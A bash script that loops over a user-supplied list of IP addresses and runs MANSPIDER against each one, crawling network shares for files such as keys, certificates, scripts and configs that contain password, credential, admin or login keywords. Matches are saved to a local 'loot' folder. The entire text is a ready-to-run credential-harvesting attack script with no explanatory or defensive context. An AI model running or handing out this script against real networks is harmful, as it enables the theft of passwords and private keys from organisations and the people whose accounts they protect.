#!/bin/bash

read -p "Enter the path to the file containing IP addresses: " IP_FILE

# Check if the file exists
if [ ! -f "$IP_FILE" ]; then
    echo "File not found: $IP_FILE"
    exit 1
fi

LOOT_DIR="$HOME/manspider_loot"

FILE_EXTENSIONS="txt doc docx xls xlsx csv db bat com vbs ps1 psd1 psm1 pem key rsa pub reg cfg conf"
KEYWORDS="passw user admin account network login logon cred"

mkdir -p "$LOOT_DIR"

while IFS= read -r ip; do
    manspider -t 20 $ip -l "$LOOT_DIR" -f "$KEYWORDS" -e "$FILE_EXTENSIONS"
done < "$IP_FILE"

echo "MANSPIDER search completed. Loot saved to $LOOT_DIR"
